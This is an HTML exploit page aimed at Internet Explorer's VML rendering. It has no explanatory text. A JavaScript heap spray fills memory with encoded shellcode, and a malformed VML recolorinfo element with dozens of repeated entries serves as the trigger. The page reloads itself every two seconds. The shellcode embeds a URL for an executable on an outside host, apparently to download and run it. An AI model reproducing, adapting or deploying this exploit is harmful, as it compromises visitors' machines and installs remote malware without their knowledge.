<html xmlns:v="urn:schemas-microsoft-com:vml">  
<head>  
<object id="VMLRender"  
classid="CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E">  
</object>  
<style>  
v:* { behavior: url(#VMLRender); }  
</style>  
</head>
<body>  
<SCRIPT language="javascript">  
setTimeout("document.location.reload(false)",2000);  
shellcode =unescape("%u9090%u9090%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u772F%u7777%u2E31%u6168%u6B63%u7265%u6F6F%u6F63%u2F6D%u2E31%u7865%u0065");  
bigblock = unescape("%u0505%u0505");  
headersize = 20;  
slackspace = headersize+shellcode.length;  
while (bigblock.length<slackspace) bigblock+=bigblock;  
fillblock = bigblock.substring(0, slackspace);  
block = bigblock.substring(0, bigblock.length-slackspace);  
while(block.length+slackspace<0x40000) block = block+block+fillblock;  
memory = new Array();  
for (i=0;i<450;i++) memory[i] = block + shellcode; 
for (i=0;i!=0;i++) memory[i] = block + shellcode;
</script>  
<v:rect style='width:120pt;height:80pt' fillcolor="red" >  
<v:recolorinfo NumColOrS="97612895" recolorstate="t">  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v:recolorinfoentry tocolor="rgb(1,0,64)" recolortype="1285"  
lbcolor="rgb(1,0,64)" forecolor="rgb(1,0,64)" backcolor="rgb(1,0,64)"  
fromcolor="rgb(1,0,64)" lbstyle ="32" bitmaptype="3"/>  
<v/recolorinfo>  
</html> 